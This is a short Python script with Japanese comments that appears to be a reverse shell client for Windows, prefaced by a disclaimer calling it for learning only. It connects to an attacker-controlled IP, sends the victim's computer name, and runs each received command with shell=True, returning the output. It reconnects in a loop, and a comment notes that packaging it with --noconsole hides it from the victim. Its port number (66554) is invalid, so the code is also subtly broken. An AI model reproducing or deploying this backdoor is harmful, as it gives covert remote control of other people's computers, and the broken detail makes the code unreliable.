#悪用は厳禁です。これを実際に実行してPCが壊れた、友情が消えた、逮捕された等の責任は一切負いません。
#あくまでも学習用としてお使いください


import socket,time,subprocess
IP = 'input server ip addr'

#コマンド実行処理
def command_execute(command):
    try:
        result = subprocess.check_output(command, shell=True)
        #一応ここでコマンド実行結果を被害者側でも出力しています。ただし、PyInstaller等でexe化する際に「--noconsole」等とコンソールを隠す設定をつけていると表示されません。
        print(result.decode('shift-jis'))
        return result
    except:
        #存在しないコマンド等であればerrorを返す。
        return b'error=1'
while True:
    try:
        #Socket生成
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            #加害者側PCに接続
            s.connect((IP, 66554))
            #自分のPC名を取得後加害者側に送信
            data = subprocess.check_output('echo %computername%', shell=True)
            s.sendall(data)
            while True:
                data = s.recv(1024)
                try:
                    #コマンドを実行し、その結果を返す
                    result = command_execute(data.decode('utf-8'))
                    if not result:
                        #実行結果が無の場合はexecutedを加害者に送信
                        s.sendall(b'executed')
                    s.sendall(result)
                except:
                    #なんか変なエラー起きたとき
                    s.sendall(b'error=0')
    except ConnectionRefusedError:
        continue
            
  

